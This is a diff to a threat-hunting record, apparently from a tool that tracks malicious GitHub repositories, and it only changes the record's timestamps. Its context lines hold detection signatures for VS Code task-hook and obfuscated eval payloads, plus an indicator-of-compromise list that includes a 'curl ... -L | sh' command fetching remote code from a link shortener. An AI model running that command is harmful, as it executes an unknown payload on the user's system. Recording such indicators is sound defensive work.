@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json', 'eval atob filename:tailwind.config.js'] | Tier-2 confirmed (bash score 12)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/icecoldjay_bri.json",
     "reviewer_decision": "",
     "notes": ""
@@ -97,7 +97,7 @@
     "evidence_references": "https://github.com/icecoldjay/bri/blob/78443912673c5ce72c01977bd5d509f757476777/.vscode/tasks.json\nhttps://github.com/icecoldjay/bri/blob/78443912673c5ce72c01977bd5d509f757476777/solana-program/.vscode/tasks.json\nhttps://github.com/icecoldjay/bri/blob/78443912673c5ce72c01977bd5d509f757476777/client/tailwind.config.js#L61\nhttps://github.com/icecoldjay/bri/blob/78443912673c5ce72c01977bd5d509f757476777/client/craco.config.js#L23\nhttps://github.com/icecoldjay/bri/blob/78443912673c5ce72c01977bd5d509f757476777/server/utils/errorHandler.js#L38",
     "verified_iocs": "pesncv.short.gy\nhttps://PEsnCV.short.gy/trJnMn9m\nhttps://PEsnCV.short.gy/trJnMn9l\nhttps://PEsnCV.short.gy/trJnMn9w\ncurl 'https://PEsnCV.short.gy/trJnMn9m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
